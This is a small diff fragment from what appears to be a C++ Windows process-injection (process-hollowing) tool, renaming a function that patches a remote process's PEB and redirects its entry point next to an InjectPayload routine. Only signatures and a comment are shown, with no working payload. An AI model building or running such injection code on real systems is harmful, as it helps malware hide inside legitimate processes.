@@ -217,7 +217,7 @@ bool InjectPayload(PROCESS_INFORMATION& pi, const std::vector<BYTE>& payload,
 }
 
 // patches peb and redirects rcx to the new entry point
-bool SetEntryPoint(PROCESS_INFORMATION& pi, DWORD64 pebAddress,
+bool ConfigEntryPoint(PROCESS_INFORMATION& pi, DWORD64 pebAddress,
                    DWORD64 remoteBase, DWORD entryPointRVA) {
     // update imagebaseaddress in peb
     SIZE_T bytesWritten = 0;
